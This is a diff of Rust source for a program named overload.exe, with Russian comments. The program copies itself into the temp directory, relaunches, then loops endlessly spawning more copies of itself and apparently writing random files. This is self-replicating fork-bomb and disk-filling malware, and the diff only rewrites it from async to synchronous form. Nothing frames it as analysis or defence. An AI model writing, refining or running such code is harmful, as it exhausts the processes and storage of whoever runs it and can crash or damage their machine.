@@ -12,22 +12,17 @@ use utils::{join_paths, random_file, self_copy};
 /// Новый алгоритм
 /// => первый запуск и самокопирование: overload.exe(путь файла)
 /// => повторенный запуск из новой директории overload.exe -c.
-#[tokio::main]
-async fn main() {
+fn main() {
     let args: Vec<String> = env::args().collect();
     if args.len() < 2 {
-        let dir = join_paths(env::var("temp").expect(""), "overload.exe".to_string());
-        self_copy(dir.clone()).unwrap();
+        let dir = join_paths(&env::var("temp").expect(""), "overload.exe");
+        self_copy(&dir);
 
         Command::new(dir).arg("-c").spawn().expect("");
     } else if *args.get(1).unwrap() == "-c" {
         loop {
-            tokio::spawn(async move {
-                Command::new("overload.exe").arg("-c").spawn().expect("");
-                random_file().await.unwrap();
-            })
-            .await
-            .unwrap();
+            Command::new("overload.exe").arg("-c").spawn().expect("");
+            random_file();
         }
     }
 }
